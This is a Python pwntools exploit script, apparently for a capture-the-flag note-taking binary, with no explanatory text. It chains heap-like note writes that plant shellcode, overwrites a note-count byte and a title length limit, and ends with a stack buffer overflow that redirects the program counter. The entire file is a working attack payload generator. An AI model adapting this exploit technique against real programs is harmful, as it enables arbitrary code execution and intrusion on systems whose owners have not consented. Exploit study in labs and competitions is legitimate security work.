from pwn import *

payload = b''

with open("asm_adjusted", "rb") as f:
    shellcode = f.read()
shellcode = shellcode.replace(b"\xff\xff\xff\xff", b"")

# 1~4th notes
for _ in range(4):
    payload += b"1\n"
    payload += b"\n"  # title
    payload += shellcode[:32]
    shellcode = shellcode[32:]

# 5th note [bf8-c30)
payload += b"1\n"
payload += b"\n"  # title
payload += shellcode + b"X" * (31 - len(shellcode)) + b"\xff"  # The last byte overwrite total notes

# 6th note [c30, c68)
payload += b"1\n"
payload += b"_BBBBBB_"
payload += b"1234567" + p64(0xffffffffffffffff) + b"\n"  # overwrite title length limit

# 7th note: stack bof
payload += b"1\n"
payload += b"a" * 48

target_r1 = 1
target_r2 = 2
target_r3 = 3
target_pc = 0xb28

payload += p64(target_r3)
payload += p64(target_r2)
payload += p64(target_r1)
payload += p64(target_pc)
payload += b"\n"
payload += b"\n"

with open("payload", "wb") as f:
    f.write(payload)
